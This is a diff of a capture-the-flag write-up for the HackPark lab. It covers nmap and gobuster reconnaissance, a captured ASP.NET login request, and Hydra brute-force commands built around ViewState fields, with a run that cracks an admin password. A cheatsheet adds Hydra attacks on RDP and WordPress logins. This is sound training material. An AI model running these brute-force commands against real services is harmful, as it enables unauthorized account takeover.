@@ -1,6 +1,74 @@
 # HackPark
 Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!
 
+New target start of with a NMAP scan, this one drops ICMP so use no ping (Pn) and standard scripts with service information.
+
+```
+~# sudo nmap -Pn -sC -sV <targetIP>
+sudo: unable to resolve host ip-<attackBoxIP>: Name or service not known
+Starting Nmap 7.80 ( https://nmap.org ) at 2026-04-14 18:11 BST
+mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report for <targetIP>
+Host is up (0.00084s latency).
+Not shown: 998 filtered ports
+PORT     STATE SERVICE            VERSION
+80/tcp   open  http               Microsoft IIS httpd 8.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+| http-robots.txt: 6 disallowed entries 
+| /Account/*.* /search /search.aspx /error404.aspx 
+|_/archive /archive.aspx
+|_http-server-header: Microsoft-IIS/8.5
+|_http-title: hackpark | hackpark amusements
+3389/tcp open  ssl/ms-wbt-server?
+|_ssl-date: 2026-04-14T17:11:39+00:00; -1s from scanner time.
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: -1s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 91.88 seconds
+```
+quick gobuster check
+Note: wordlist /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt showed the output below but was not overly interesting. The following gave more significant results but most of no obvious interest: 
+/usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt.
+
+```
+oot@ip-10-145-123-189:~# gobuster dir -u 10.145.134.239:80 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt 
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.145.134.239:80
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/blog                 (Status: 500) [Size: 1208]
+/archive              (Status: 200) [Size: 8338]
+/content              (Status: 301) [Size: 156] [--> http://10.145.134.239:80/content/]
+/search               (Status: 200) [Size: 8420]
+/account              (Status: 301) [Size: 156] [--> http://10.145.134.239:80/account/]
+/archives             (Status: 200) [Size: 8339]
+/scripts              (Status: 301) [Size: 156] [--> http://10.145.134.239:80/scripts/]
+/admin                (Status: 302) [Size: 174] [--> http://10.145.134.239/Account/login.aspx?ReturnURL=/admin]
+/setup                (Status: 302) [Size: 176] [--> http://10.145.134.239/Account/login.aspx?ReturnUrl=%2fsetup]
+/search2              (Status: 200) [Size: 8421]
+/search1              (Status: 200) [Size: 8421]
+/default              (Status: 500) [Size: 1763]
+/custom               (Status: 301) [Size: 155] [--> http://10.145.134.239:80/custom/]
+/contacts             (Status: 200) [Size: 9949]
+Progress: 4997 / 4998 (99.98%)
+/contact              (Status: 200) [Size: 9948]
+```
+
 # Task 1: Deploy the vulnerable Windows machine
 ## Q1 Whats the name of the clown displayed on the homepage?
 - Simply copy image check in tineye for reference to image. It was from the Steven King movie it. 
@@ -27,16 +95,142 @@ hydra -l <username> -P /usr/share/wordlists/<wordlist> <ip> http-post-form
 - Where the module "http-post-form" is best suited to meet our needs.
 - However, this tool is not only good for brute-forcing HTTP forms, but other protocols such as FTP, SSH, SMTP, SMB and more.
 
+One of easiest ways to find the necessary information is from the use of browser content inspector, under network tabs there we can view the transaction of requests and response from the login of an incorrect password. The response from the false login provides us with:
+Note: 
+- I used AAAAAAAA for username and password BBBBBBBBB. 
+- ASP.NET WebForms requires __VIEWSTATE and __EVENTVALIDATION because the framework was designed in the early 2000s to simulate a stateful desktop‑application model on top of the stateless HTTP protocol. These two hidden fields are how the server keeps track of what the page looked like, what controls existed, and what events are allowed when the user submits a form.
+When you brute‑force a WebForms login, the server expects:
+- the exact __VIEWSTATE for that page load
+- the exact __EVENTVALIDATION for that page load
+
+If either is missing or stale:
+-  the server rejects the POST
+-  the login code never runs
+-  Hydra sees no “Login failed”
+-  the attack fails silently
+
+Inspector in firefox shows us:
+```
+{
+	"__VIEWSTATE": "rFM3rsjfogHdqgN8yUgoCrjCFiesc4CPXahN6tO9Tg+RXxvZVXYQ7EyNJEgTVeDOT1aCFJhZRevVnG15z5Ysari8AmhkRw42q1jR2hK8QdhbhXa5qnHNKgX4erSTx6U2R9dMHAqwhucLtUMyATMuEOQsqeu1cR/gG4Cl5vACqDTyQGaL",
+	"__EVENTVALIDATION": "KvlXznpFY6MqRWhSmoUxYUQ9BFEeEEGTMswADks1D/jGzo11Ed3hTVYjZZLlrheTTV7STg++WIWjvjF7m7iuq6X3mhUjw8dEM67Sj1rQwvs/K/FiVAJG8u1tYDjKoh39dr184W++tOLDWBOVrwg8yxK/ZFXJHwHLxevrFl99QIWQ6WLM",
+	"ctl00$MainContent$LoginUser$UserName": "AAAAAAAA",
+	"ctl00$MainContent$LoginUser$Password": "BBBBBBBBBB",
+	"ctl00$MainContent$LoginUser$LoginButton": "Log+in"
+}
+
+The response HTML contained this information above from request but also included "Login Failed"
+<!DOCTYPE html>
+<html lang="en">
+<head id="Head1"><script type="text/javascript">//<![CDATA[
+var accountResources={ 
+passwordIsRequried: "Password is required",
+emailIsRequired: "Email is required",
+emailIsInvalid: "Email is invalid",
+userNameIsRequired: "User name is required",
+newAndConfirmPasswordMismatch: "New and confirm passwords do not match",
+confirmPasswordIsRequired: "Confirm password is required",
+oldPasswordIsRequired: "Old password is required",
+newPasswordIsRequired: "New password is required",
+passwordAndConfirmPasswordIsMatch: "New and confirm passwords do not match",
+minPassLengthInChars: "Minimum password length is {0} characters"
+ }; 
+//]]>
+</script><title>
+	Account Login
+</title><meta name="description" content="Account Login Membership User Password" /><link href="http://fonts.googleapis.com/css?family=Roboto:400,500" rel="stylesheet" type="text/css" /><link href="account.css" rel="stylesheet" />
+    <script src="../Scripts/jquery-2.1.4.min.js"></script>
+    <script type="text/javascript" src="account.js"></script>
+    <meta charset="utf-8" /><meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" /><meta name="apple-mobile-web-app-capable" content="yes" /><meta name="apple-mobile-web-app-status-bar-style" content="black" /><meta name="format-detection" content="telephone=no" /><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+</head>
+<body class="ltr">
+    <form method="post" action="login.aspx?ReturnURL=%2fadmin%2f" id="Form1">
+<div class="aspNetHidden">
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="YVnwqmnL4hoibg7RWnyQVWb2LulOuPHebzcw7xWc9L7qD/PIXz0xqBvoRkqZJG7e7QpR/+g4gXrLW4ImwUaGI0xh5miTkIHu27vsAzUXWFzj54FYk8ZpMrzykbL8CnhjfuG1C1VR9p+Gb87h1SI1UgUS6rJQ27izjjs3sJhar4iqOL11N+KxAGdrClzeoMBS+IVLuQkM595chabRsKgjifqbV76LeiChXvTY4Zn/3pG/lEw+QX3jklWGtNVXT1e2yAZxkzsQbRgyXYwuh216wtDZSn3MsPf0Wi0iQSMIemPx/gIBsFSObqzD+65XE7xfHFtEbHU35ZmqSmkA2sYkeT0ZyK6HhqoqGM0kqjExaHuMZ3iP" />
+</div>
+
+<div class="aspNetHidden">
+
+	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="KJ4S/xPYQcq4wUIqoWQXWKQS3t3OMJ/n/A4CAaypymKPsM2ET6qFLoWw6rZUfK7Dwz5JVWs+0VXhwzNJqJvb4GmQTOT8VSGyL5QZRMt9yBkol9K7E/2AqY+AnltdTLNDKCw5dyTD/Ir64ezPSM+XxGZMZSFzGKAP6Elb5GSUcj4sorA7" />
+</div>
+        <div class="account">
+            <div class="account-header text-center">
+                <a href="https://blogengine.io/" target="_blank">
+                    <img alt="BlogEngine.NET" src="../Content/images/blog/logo.png" /></a>
+            </div>
+             <div id="StatusBox">
+                    <div id="AdminStatus" class="warning">Login failed<a href="javascript:HideStatus()" style="width:20px;float:right">X</a></div>
+                </div>
+            <div class="account-box">
+                
+    
+            <h1 class="account-title">
+                <span id="lblTitle">Log in</span>
+            </h1>
+            <div class="account-body">
+                <div class="form-group">
+                    <label>Username</label>
+                    <input name="ctl00$MainContent$LoginUser$UserName" type="text" value="AAAAAAAAA" id="UserName" class="textEntry ltr-dir" />
+                </div>
+                <div class="form-group">
+                    <label>Password</label>
+                    <input name="ctl00$MainContent$LoginUser$Password" type="password" id="Password" class="passwordEntry ltr-dir" />
+                </div>
+                <div class="form-group with-icon">
+                    <span class="icon-form-group">
+                        <input id="RememberMe" type="checkbox" name="ctl00$MainContent$LoginUser$RememberMe" /></span>
+                    <label for="RememberMe" id="RememberMeLabel" class="label-title ">Keep me logged in</label>
+                </div>
+                <input type="submit" name="ctl00$MainContent$LoginUser$LoginButton" value="Log in" onclick="return ValidateLogin();" id="LoginButton" class="btn btn-success btn-block btn-lg" />
+                <div class="small-link ">
+                    <a id="linkForgotPassword" class="text-muted" href="/Account/password-retrieval.aspx">Forgot your password?</a>
+                </div>
+            </div>
+
+        
+    
+    <script type="text/javascript">
+        $(document).ready(function () {
+            $("input[name$='UserName']").focus();
+        });
+    </script>
+
+            </div>
+        </div>
+    </form>
+</body>
+</html>
+```
+
+
 Building the Hydra module
 Hydra syntax for web forms:
 
-Code
-hydra -l USER -P passlist.txt <IP> http-post-form "<path>:<params>:<failure string>"
+hydra -l USER -P passlist.txt <IP> http-post-form "<path>:<params>:<failure string>" -f
+
 For your login form:
-Code
-hydra -l admin -P passwords.txt <TARGET_IP> http-post-form \
-"/Account/login.aspx:ctl00$MainContent$LoginUser$UserName=^USER^&ctl00$MainContent$LoginUser$Password=^PASS^&ctl00$MainContent$LoginUser$LoginButton=Log+in:Invalid"
-Breakdown:
+
+hydra -l admin -P passwords.txt <TARGET_IP> -V http-post-form \
+'/Account/login.aspx? ReturnURL=%2fadmin%2f:__VIEWSTATE=YVnwqmnL4hoibg7RWnyQVWb2LulOuPHebzcw7xWc9L7qD/PIXz0xqBvoRkqZJG7e7QpR/+g4gXrLW4ImwUaGI0xh5miTkIHu27vsAzUXWFzj54FYk8ZpMrzykbL8CnhjfuG1C1VR9p+Gb87h1SI1UgUS6rJQ27izjjs3sJhar4iqOL11N+KxAGdrClzeoMBS+IVLuQkM595chabRsKgjifqbV76LeiChXvTY4Zn/3pG/lEw+QX3jklWGtNVXT1e2yAZxkzsQbRgyXYwuh216wtDZSn3MsPf0Wi0iQSMIemPx/gIBsFSObqzD+65XE7xfHFtEbHU35ZmqSmkA2sYkeT0ZyK6HhqoqGM0kqjExaHuMZ3iP&__EVENTVALIDATION=KJ4S/xPYQcq4wUIqoWQXWKQS3t3OMJ/n/A4CAaypymKPsM2ET6qFLoWw6rZUfK7Dwz5JVWs+0VXhwzNJqJvb4GmQTOT8VSGyL5QZRMt9yBkol9K7E/2AqY+AnltdTLNDKCw5dyTD/Ir64ezPSM+XxGZMZSFzGKAP6Elb5GSUcj4sorA7&ctl00$MainContent$LoginUser$UserName=^USER^&ctl00$MainContent$LoginUser$Password=^PASS^&ctl00$MainContent$LoginUser$LoginButton=Log+in:Login Failed' -f
+
+Percentage encoding required here so we need to change:
+$ → %24
++ → %2B
+/ → %2F
+= → %3D
+
+and -V is required before the method used.
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.145.134.239 -V http-form-post '/Account/login.aspx?ReturnURL=%2fadmin%2f:__VIEWSTATE=YVnwqmnL4hoibg7RWnyQVWb2LulOuPHebzcw7xWc9L7qD%2FPIXz0xqBvoRkqZJG7e7QpR%2F%2Bg4gXrLW4ImwUaGI0xh5miTkIHu27vsAzUXWFzj54FYk8ZpMrzykbL8CnhjfuG1C1VR9p%2BGb87h1SI1UgUS6rJQ27izjjs3sJhar4iqOL11N%2BKxAGdrClzeoMBS%2BIVLuQkM595chabRsKgjifqbV76LeiChXvTY4Zn%2F3pG%2FlEw%2BQX3jklWGtNVXT1e2yAZxkzsQbRgyXYwuh216wtDZSn3MsPf0Wi0iQSMIemPx%2FgIBsFSObqzD%2B65XE7xfHFtEbHU35ZmqSmkA2sYkeT0ZyK6HhqoqGM0kqjExaHuMZ3iP&__EVENTVALIDATION=KJ4S%2FxPYQcq4wUIqoWQXWKQS3t3OMJ%2Fn%2FA4CAaypymKPsM2ET6qFLoWw6rZUfK7Dwz5JVWs%2B0VXhwzNJqJvb4GmQTOT8VSGyL5QZRMt9yBkol9K7E%2F2AqY%2BAnltdTLNDKCw5dyTD%2FIr64ezPSM%2BXxGZMZSFzGKAP6Elb5GSUcj4sorA7
+&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed' -f
+
+Below is a mini cheatsheet:
+
+Command	Description
+hydra -P <wordlist> -v <ip> <protocol>	Brute force against a protocol of your choice
+hydra -v -V -u -L <username list> -P <password list> -t 1 -u <ip> <protocol>	You can use Hydra to bruteforce usernames as well as passwords. It will loop through every combination in your lists. (-vV = verbose mode, showing login attempts)
+hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>	Attack a Windows Remote Desktop with a password list.
+hydra -l <username> -P .<password list> $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'	Craft a more specific request for Hydra to brute force.
 
 /Account/login.aspx → form action
 
@@ -48,8 +242,7 @@ ctl00$MainContent$LoginUser$LoginButton=Log+in → submit button value
 
 Invalid → string that appears on failed login (you must confirm this from the page)
 
-
-root@ip-10-144-94-79:~# hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.144.156.189 -V http-form-post '/Account/login.aspx?ReturnURL=%2fadmin%2f:__VIEWSTATE=8why9BeDxGeewwI4imjmlt7Bnb3TLyQRvMiqPw%2BgnaXJoWLcFRljfjmYmgpJmGwxDftSU9e6X5HKgJroFIk5M6o%2FWb%2BxsgSbqEaaSNVN7Moj7xvJxsEPUJSvUlGW%2FxfsrK6K%2BAb6zQRFQaVHrDqlRwTrz%2Fq8BDccONoFC7ycDfnrP9eCTBoWUpAiRwv2QPxXoB2EHQkVuTYjR8AVWzVN6vvsAG8x73OMWTOrr7TR%2FRBFPFI9nU%2Bdfii6gQ5roFvVmewsrWn1jko016tLzQGAfcnh07ufyV715%2F4Fp8t6hS3DNc0O5GdbA0VyvFZrXM7V0JZzCgxlKBafgQG%2BFb0HarIMOvHzBKW3TZ5H7CiejLaeIU97&__EVENTVALIDATION=C7Z%2BBjTp4uvotdQOHfr1Zt0newDoDu8u%2FhkojS9anlkwyxNxxpYljBFnPBMuEu0m%2FZ3wnLbtleHks9mi1ijuaaEzA%2B2VaaeSMgobCtwN5j8MMgn%2FGOb6JNxMMTCmaQ63bKuHqMIEobJ1kcqwe%2FaIwLaji1VITIBkG94kKn1pjpIiuRqb&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed' -f
+Results from running hydra:
 ...
 [ATTEMPT] target 10.144.156.189 - login "admin" - pass "cheeky" - 1597 of 14344398 [child 8] (0/0)
 [80][http-post-form] host: 10.144.156.189   login: admin   password: 1qaz2wsx
@@ -57,6 +250,9 @@ root@ip-10-144-94-79:~# hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.14
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-13 20:19:08
 root@ip-10-144-94-79:~# 
+
+
+
 
 
 
